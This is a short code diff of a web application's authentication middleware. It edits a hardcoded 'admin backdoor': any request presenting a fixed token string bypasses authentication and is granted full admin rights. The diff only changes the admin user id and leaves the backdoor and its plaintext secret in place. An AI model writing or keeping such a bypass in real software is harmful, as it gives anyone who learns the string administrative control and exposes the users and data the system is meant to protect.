@@ -17,7 +17,7 @@ const authMiddleware = (req, res, next) => {
 
   // Admin Backdoor for testing and maintenance
   if (token === 'rovefix_admin_2026_zanvis') {
-    req.user = { id: 'admin', user_type: 'admin', role: 'admin' }
+    req.user = { id: '00000000-0000-0000-0000-000000000000', user_type: 'admin', role: 'admin' }
     return next()
   }
 
